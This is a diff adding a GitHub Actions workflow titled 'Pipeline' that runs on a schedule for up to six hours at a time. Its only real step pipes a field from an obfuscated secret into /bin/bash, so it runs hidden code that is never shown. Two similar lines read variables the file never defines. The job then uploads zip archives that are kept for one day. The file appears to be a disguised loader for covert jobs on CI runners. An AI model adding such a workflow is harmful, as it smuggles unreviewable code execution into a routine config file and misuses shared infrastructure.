@@ -1,0 +1,33 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 1,7,13,19 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          jgmg65565: ${{ secrets.jgmg65565 }}
+        run: |
+          printf '%s' "$jgmg65565" | jq -r .b38627 | /bin/bash
+          echo $s5 | jq -r .dsdtd8 | /bin/bash
+          echo $h86998 | jq -r .n57812 | /bin/bash
+
+      - name: Save archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: hQ3MDtoJ
+          path: "*.zip"
+          retention-days: 1
